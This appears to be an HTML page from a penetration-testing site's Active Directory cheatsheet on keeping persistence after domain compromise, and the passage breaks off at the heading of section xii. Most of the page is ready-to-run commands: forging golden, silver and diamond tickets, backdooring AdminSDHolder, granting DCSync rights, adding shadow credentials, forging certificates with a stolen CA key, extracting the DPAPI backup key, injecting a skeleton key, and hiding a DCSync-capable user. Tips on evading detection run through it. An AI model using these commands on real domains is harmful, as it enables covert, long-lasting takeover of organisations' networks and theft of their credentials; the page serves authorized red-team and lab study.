@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Persistence | JinPwn</title><meta name="description" content="After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/">
+<meta property="og:title" content="Persistence | JinPwn">
+<meta property="og:description" content="After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Persistence | JinPwn">
+<meta name="twitter:description" content="After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Persistence | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link">Enumeration</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link is-current">Persistence</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Persistence</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Persistence</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Active Directory Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link">Enumeration</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link is-current">Persistence</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>After you reach DA (or close to it), lock in long-term access. Pick mechanisms by detectability and durability, depending on the engagement.</p>
+<div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Scope check</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>AD persistence on a real engagement requires explicit written authorization. Even a &ldquo;harmless&rdquo; backdoor like an ACL change can violate scope. On HTB/labs anything goes.</p>
+  </div>
+</div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
+</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;Administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;AdminPass!&#39;</span>
+</span></span></code></pre></div><h2 id="i-golden-ticket-krbtgt-based" data-heading-permalink="true"><span class="heading-content">i. Golden Ticket (krbtgt-based)</span>
+    <a class="heading-permalink" href="#i-golden-ticket-krbtgt-based" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Forge a TGT for any user, valid until the krbtgt password changes (typically never, or only after a known compromise).</p>
+<h3 id="step-1-dump-krbtgt" data-heading-permalink="true"><span class="heading-content">Step 1: Dump krbtgt</span>
+    <a class="heading-permalink" href="#step-1-dump-krbtgt" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -just-dc-user krbtgt <span class="nv">$DOMAIN</span>/<span class="nv">$USER</span>:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Note the krbtgt NT hash and AES256 key from output</span>
+</span></span></code></pre></div><h3 id="step-2-forge-tgt" data-heading-permalink="true"><span class="heading-content">Step 2: Forge TGT</span>
+    <a class="heading-permalink" href="#step-2-forge-tgt" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## With NT hash (RC4 ticket, easier to detect)</span>
+</span></span><span class="line"><span class="cl">impacket-ticketer -nthash <span class="nv">$KRBTGT_NT</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain-sid <span class="nv">$DOMAIN_SID</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain <span class="nv">$DOMAIN</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  Administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## With AES256 (less detectable, preferred)</span>
+</span></span><span class="line"><span class="cl">impacket-ticketer -aesKey <span class="nv">$KRBTGT_AES256</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain-sid <span class="nv">$DOMAIN_SID</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain <span class="nv">$DOMAIN</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  Administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: Administrator.ccache</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass dc.<span class="nv">$DOMAIN</span>
+</span></span></code></pre></div><p>Mimikatz equivalent (Windows side):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:$DOMAIN_SID /krbtgt:$KRBTGT_NT /ptt
+</span></span><span class="line"><span class="cl">mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:$DOMAIN_SID /aes256:$KRBTGT_AES256 /ptt
+</span></span></code></pre></div><p>Lifetime defaults to 10 years. Customize:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -aesKey <span class="nv">$AES</span> -domain-sid <span class="nv">$SID</span> -domain <span class="nv">$DOMAIN</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -duration <span class="m">365</span> -user-id <span class="m">500</span> -groups 512,513,518,519,520 Administrator
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Defeating Golden Tickets</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Resetting <code>krbtgt</code> password TWICE (with replication delay between) invalidates all golden tickets. Defenders do this on incident response. Pull a fresh krbtgt hash periodically if you need long-term access.</p>
+  </div>
+</div>
+<h2 id="ii-silver-ticket-service-account-hash" data-heading-permalink="true"><span class="heading-content">ii. Silver Ticket (service account hash)</span>
+    <a class="heading-permalink" href="#ii-silver-ticket-service-account-hash" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Forge a TGS directly to a specific service. No DC involved during use, so no Event 4768/4769 from your activity:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -nthash <span class="nv">$SERVICE_NT</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain-sid <span class="nv">$DOMAIN_SID</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain <span class="nv">$DOMAIN</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -spn cifs/server.corp.local <span class="se">\
+</span></span></span><span class="line"><span class="cl">  Administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Use it:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
+</span></span><span class="line"><span class="cl">impacket-psexec -k -no-pass server.corp.local
+</span></span></code></pre></div><p>Silver vs Golden:</p>
+<ul>
+<li>Silver = specific service, doesn&rsquo;t touch DC</li>
+<li>Golden = TGT, used to request any service from any DC</li>
+<li>Silver survives krbtgt resets, dies only if the service account&rsquo;s password changes</li>
+</ul>
+<h2 id="iii-diamond--sapphire-ticket" data-heading-permalink="true"><span class="heading-content">iii. Diamond / Sapphire Ticket</span>
+    <a class="heading-permalink" href="#iii-diamond--sapphire-ticket" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Modify a real DC-issued TGT instead of forging from scratch. Looks much more legitimate in logs.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-ticketer -aesKey <span class="nv">$KRBTGT_AES</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain-sid <span class="nv">$DOMAIN_SID</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain <span class="nv">$DOMAIN</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -request -user <span class="nv">$USER</span> -password <span class="nv">$PASS</span> -dc-ip <span class="nv">$DC</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -user-id <span class="m">500</span> -groups 512,513,518,519,520 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  Administrator
+</span></span></code></pre></div><p>The <code>-request</code> flag tells ticketer to first get a real TGT and modify its PAC.</p>
+<p>Sapphire ticket (newer, uses S4U2self trick to make the PAC look perfect): emerging tools (Rubeus has partial support), worth checking GitHub for current PoCs.</p>
+<h2 id="iv-adminsdholder-acl-backdoor" data-heading-permalink="true"><span class="heading-content">iv. AdminSDHolder ACL backdoor</span>
+    <a class="heading-permalink" href="#iv-adminsdholder-acl-backdoor" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>AdminSDHolder is a template object in the domain. Every 60 minutes, the SDProp process copies its ACL onto every protected object (Domain Admins, Account Operators, etc).</p>
+<p>If you add an ACE granting yourself rights on AdminSDHolder, SDProp pushes it to every protected group. You get GenericAll on Domain Admins until someone notices.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> add genericAll <span class="se">\
+</span></span></span><span class="line"><span class="cl">  <span class="s2">&#34;CN=AdminSDHolder,CN=System,DC=corp,DC=local&#34;</span> attacker
+</span></span><span class="line"><span class="cl"><span class="c1">## Wait 60 minutes (or force SDProp via DSRM if you have it)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Now attacker has GenericAll on every protected group</span>
+</span></span></code></pre></div><p>Detection: enterprise defenders watch AdminSDHolder ACL changes specifically. Loud but durable.</p>
+<h2 id="v-dcsync-rights-for-a-regular-user" data-heading-permalink="true"><span class="heading-content">v. DCSync rights for a regular user</span>
+    <a class="heading-permalink" href="#v-dcsync-rights-for-a-regular-user" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Cleaner than AdminSDHolder. Grant a non-privileged account the two replication rights:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add dcsync svc_user
+</span></span><span class="line"><span class="cl"><span class="c1">## Now svc_user can dump every hash without being in any privileged group</span>
+</span></span></code></pre></div><p>When investigating, defenders look at group memberships first. DCSync rights are an ACL on the domain object - easy to miss without specific tooling.</p>
+<p>Cleanup:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> remove dcsync svc_user
+</span></span></code></pre></div><h2 id="vi-shadow-credentials-on-a-privileged-account" data-heading-permalink="true"><span class="heading-content">vi. Shadow Credentials on a privileged account</span>
+    <a class="heading-permalink" href="#vi-shadow-credentials-on-a-privileged-account" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Once you have GenericWrite on a target (or a privileged target), add a Key Credential. You can authenticate as that target anytime via PKINIT without knowing/breaking their password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add shadowCredentials Administrator
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: Administrator.ccache (or .pfx)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Anytime later:</span>
+</span></span><span class="line"><span class="cl">certipy auth -pfx Administrator.pfx -dc-ip <span class="nv">$DC</span>
+</span></span></code></pre></div><p>Cleanup when no longer needed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> remove shadowCredentials Administrator
+</span></span></code></pre></div><p>Survives password changes. The key persists until explicitly removed.</p>
+<h2 id="vii-certificate-based-persistence-forge-with-ca-private-key" data-heading-permalink="true"><span class="heading-content">vii. Certificate-based persistence (forge with CA private key)</span>
+    <a class="heading-permalink" href="#vii-certificate-based-persistence-forge-with-ca-private-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>If you compromised the CA host, extract its private key. Forge certs for any user, indefinitely:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## On CA host:
+</span></span><span class="line"><span class="cl">mimikatz # crypto::capi
+</span></span><span class="line"><span class="cl">mimikatz # crypto::certificates /export
+</span></span><span class="line"><span class="cl">## Or:
+</span></span><span class="line"><span class="cl">certipy ca -backup -ca CORP-CA -u $USER@$DOMAIN -p $PASS
+</span></span></code></pre></div><p>Then offline forge:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy forge -ca-pfx ca.pfx -upn Administrator@<span class="nv">$DOMAIN</span> -subject <span class="s1">&#39;CN=Administrator&#39;</span>
+</span></span><span class="line"><span class="cl">certipy auth -pfx Administrator_forged.pfx -dc-ip <span class="nv">$DC</span>
+</span></span></code></pre></div><p>Forged certs:</p>
+<ul>
+<li>Last as long as the CA cert is valid (often years)</li>
+<li>Survive password resets</li>
+<li>Hard to detect without monitoring issued cert serials</li>
+</ul>
+<h2 id="viii-dpapi-domain-backup-key" data-heading-permalink="true"><span class="heading-content">viii. DPAPI Domain Backup Key</span>
+    <a class="heading-permalink" href="#viii-dpapi-domain-backup-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The domain DPAPI backup key (held by DCs) can decrypt every user&rsquo;s DPAPI secrets on every host. Once you extract it, you have a forever-key for credential harvesting:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-dpapi backupkeys -t <span class="nv">$DOMAIN</span>/Administrator:<span class="nv">$PASS</span>@<span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## or:</span>
+</span></span><span class="line"><span class="cl">mimikatz <span class="c1"># lsadump::backupkeys /system:$DC /export</span>
+</span></span></code></pre></div><p>The backup key doesn&rsquo;t change. As long as DPAPI exists in the domain, this key decrypts every DPAPI-protected secret on every host: saved browser passwords, RDP creds, mail clients, etc.</p>
+<h2 id="ix-skeleton-key" data-heading-permalink="true"><span class="heading-content">ix. Skeleton Key</span>
+    <a class="heading-permalink" href="#ix-skeleton-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Inject a master password into LSASS on a DC. Anyone can auth as anyone with the skeleton password. Default: &ldquo;mimikatz&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## On the DC, as SYSTEM:
+</span></span><span class="line"><span class="cl">mimikatz # privilege::debug
+</span></span><span class="line"><span class="cl">mimikatz # misc::skeleton
+</span></span></code></pre></div><p>Dies on DC reboot. Re-inject after each reboot. Mostly historical/red-team-flag territory now (most EDR catches it), but works on undefended boxes.</p>
+<h2 id="x-dsrm-sync" data-heading-permalink="true"><span class="heading-content">x. DSRM Sync</span>
+    <a class="heading-permalink" href="#x-dsrm-sync" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The DC&rsquo;s local Administrator (DSRM mode) password can be configured to sync with a domain account&rsquo;s password. Set this up, then any reset of that domain account = you also know the DSRM password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">mimikatz # lsadump::sam /patch
+</span></span><span class="line"><span class="cl">## Note the DSRM hash
+</span></span><span class="line"><span class="cl">## Set DSRM behavior:
+</span></span><span class="line"><span class="cl">reg add <span class="s2">&#34;HKLM\System\CurrentControlSet\Control\Lsa&#34;</span> /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
+</span></span><span class="line"><span class="cl">## Now you can PsExec to the DC as <span class="s2">&#34;.\Administrator&#34;</span> with the DSRM hash
+</span></span></code></pre></div><h2 id="xi-hidden-user--hidden-acl" data-heading-permalink="true"><span class="heading-content">xi. Hidden user / hidden ACL</span>
+    <a class="heading-permalink" href="#xi-hidden-user--hidden-acl" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Create a backup user that doesn&rsquo;t show in normal enumeration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Create the user in an OU defenders don&#39;t watch (e.g. a Builtin container, custom OU)</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add user backup_svc <span class="s1">&#39;P@ssw0rd!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --ou <span class="s2">&#34;OU=Disabled,DC=corp,DC=local&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Hide it from default LDAP queries by clearing common readable attributes:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> <span class="nb">set</span> object backup_svc description
+</span></span><span class="line"><span class="cl"><span class="c1">## Grant it DCSync:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u Administrator -p <span class="nv">$ADMINPASS</span> --host <span class="nv">$DC</span> add dcsync backup_svc
+</span></span></code></pre></div><p>Combined with AdminCount tricks (don&rsquo;t add to protected groups, won&rsquo;t be SDProp-protected, less audit attention) and unusual OU placement.</p>
+<h2 id="xii-computer-account-persistence" data-heading-permalink="true"><span class="heading-content">xii. Computer account persistence</span>
